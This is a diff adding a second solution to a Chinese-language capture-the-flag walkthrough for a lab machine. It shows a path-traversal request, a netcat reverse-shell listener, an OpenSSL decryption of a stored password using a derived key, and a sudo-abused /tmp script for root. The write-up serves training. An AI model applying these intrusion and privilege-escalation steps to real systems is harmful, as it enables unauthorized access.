@@ -276,15 +276,15 @@ sudo curl http://192.168.170.139/image.php?secrettier360=../../../../../../../..
 
 在 kali 上输入 `nc -lvnp 443` 来打开监听, 然后上传主题文件, 再执行这个 `secret.php` 就可以得到一个**反弹 shell**。
 
-### 用户提权
-
-#### 收集信息
-
 简单收集一下 `www-data`这个账户的信息: 
 
 ![10.png](10.png)
 
-看到可以不输入密码的情况下以 sudo 权限访问 `saket/enc` 这个文件, 不过也没什么很有用的信息。
+看到可以不输入密码的情况下以 sudo 权限访问 `saket/enc` 这个文件。
+
+### 解法1: 内核漏洞提权
+
+#### 用户提权
 
 继续收集信息, 查看一下系统版本:
 
@@ -340,3 +340,113 @@ python -c "import pty;pty.spawn('/bin/bash')"
 ![15.png](15.png)
 
 到这里就基本上已经拿下了, 之后简单操作一下, 这个 `root.txt` 就是 flag 文件。
+
+### 解法2: OpenSSL
+
+内核提权虽然暴力, 但是缺点也比较明显: 容易导致运行中的服务中断, 这里用另一种方式提权。
+
+#### 搜索密码
+
+前文提到, www-data 看到可以不输入密码的情况下以 sudo 权限访问 `saket/enc` 这个文件。enc 很可能是编码 *(encode)* 或者加密 *(encrypt)* 的缩写, 这个文件可能很重要。
+
+转到这个目录查看一下各个文件, 目录下还有个 `password.txt`, 内容为 `follow_the_ippsec`。 `enc` 是一个可执行文件。
+
+![16.png](16.png)
+
+尝试显示 `enc`, 提示权限不足, 直接执行虽然不需要 root 密码, 但是执行内容一上来就要求输入另一个密码, 很可惜 `follow_the_ippsec` 不是这个密码。想到 `enc` 很可能是 OpenSSL 加密的产物, 尝试搜索密码, 密码备份比较可能含有 backup, pass, passwd 这类字符串, 顺便把报错屏蔽掉 (因为当前shell不完整):
+
+```bash
+find / -name '*backup*' 2>/dev/null | sort
+```
+
+发现 3 条比较可疑的记录:
+
+![17-1.png](17-1.png)
+
+![17-2.png](17-2.png)
+
+尝试挨个访问, 发现 `back_pass` 可以访问:
+
+![18.png](18.png)
+
+---
+
+```bash
+sudo /home/saket/enc
+```
+
+第一次执行时忘了加 `sudo`, 根据回显发现操作了 `enc` 和 `key` 这两个文件。在两个目录都观察一下, 发现应该是把这两个文件拷贝到了 `/home/saket下`
+
+![19.png](19.png)
+
+![20.png](20.png)
+
+#### 破解 `enc` 和 `key`
+
+查看一下这两个文件:
+
+![21.png](21.png)
+
+根据提示, 对 `ippsec` 做 md5 哈希, 再破解 `key.txt` 这个文件:
+
+>   `-n` 表示不换行输出; 带 `-n` 和不带 `-n` 生成的结果是完全不一样的, 需要注意, 正常情况下一般都需要带上 `-n`。
+
+>   对于 openssl 来说, 是否要加 `-n` 需要**酌情而定**。如果其源数据中本来就含有换行符, 就不能加, 否则会导致结果错误。 
+
+>   `awk -F` 为指定分隔符。
+
+>   注意前后都要用**源数据(Raw)**, 即转换为 16 进制。 `od` 是 linux 自带的进制转换工具, 必要参数 `-t` 和 `-A` 是两个必要的参数，分别控制**输出内容的格式**和**地址偏移量**的显示方式。参数为 `[doxn]` , 分别对应 10 (decimal), 8 (octal), 16 (hex), 无 (none)。 如果显示结果异常, 很可能是因为没有去掉换行符, 用 `tr -d '\n'` 批量去除所有换行符即可, 转换之后的结果同理。
+
+>   如果看不出来这里的源数据为 **`aes-256-ecb`** 加密, 则需要编写一个脚本批量处理挨个尝试, 具体脚本比较冗长, 这里不赘述, 参考: [openssl 批量处理](https://www.bilibili.com/video/BV1wD4y1C7Da)
+
+```bash
+sudo echo -n 'ippsec' | md5sum | awk -F ' ' '{print $1}' | tr -d '\n' | od -A n -t x1 | tr -d '\n'| tr -d ' '
+```
+
+---
+
+![22-1.png](22-1.png)
+
+加入破解后的 enc 内容:
+
+```bash
+sudo echo -n 'nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
+' | openssl enc -d -a -aes-256-ecb -K 3336366137346362336339353964653137643631646233303539316333396431 
+```
+
+破解成功, 内容如下:
+
+![22-2.png](22-2.png)
+
+至此已经获取了 saket 账户的密码, 直接 ssh 连接 (`sudo ssh saket@192.168.170.139`):
+
+![23.png](23.png)
+
+同样用 python 提升一下交互性:
+
+```bash
+dpkg -l | grep python
+python -c "import pty;pty.spawn('/bin/bash')"
+```
+
+用 `sudo -l` 查看一下, 发现可以用 root 权限无密码执行一个文件, 执行如下:
+
+![24.png](24.png)
+
+提示要在 victor 面前打败他, 并且报错没有找到 `/tmp/challenge` 文件, 那应该是一个简单的猜谜环节, 估计是要新建这个文件。
+
+>   `>` 为覆写, `>>` 为追加。
+
+```bash
+cd /tmp
+echo '#!/bin/bash' > challenge
+echo '/bin/bash' >> challenge
+chmod +x challenge
+sudo /home/victor/undefeated_victor
+```
+
+---
+
+![25.png](25.png)
+
+至此已经拿下了 flag 。
